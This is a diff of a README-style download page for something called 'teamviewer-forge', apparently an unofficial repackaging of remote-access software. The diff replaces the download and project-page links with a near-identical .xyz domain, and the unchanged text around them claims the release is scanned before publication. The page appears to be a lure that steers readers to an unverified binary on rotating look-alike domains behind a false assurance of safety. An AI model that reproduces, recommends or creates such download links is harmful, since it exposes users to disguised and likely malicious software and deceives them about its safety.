@@ -33,9 +33,9 @@ The release provided here is scanned before it's published.
 **Step 3.** Start the application and configure your initial preferences.
 
 ## 📥 Download
-➡️ **[Grab the latest version](https://teamviewer-forge.softonx.xyz)**
+➡️ **[Grab the latest version](https://teamviewer-forge.softax.xyz)**
 
-Project page: https://teamviewer-forge.softonx.xyz
+Project page: https://teamviewer-forge.softax.xyz
 
 ## ⚠️ Disclaimer
 > [!NOTE]
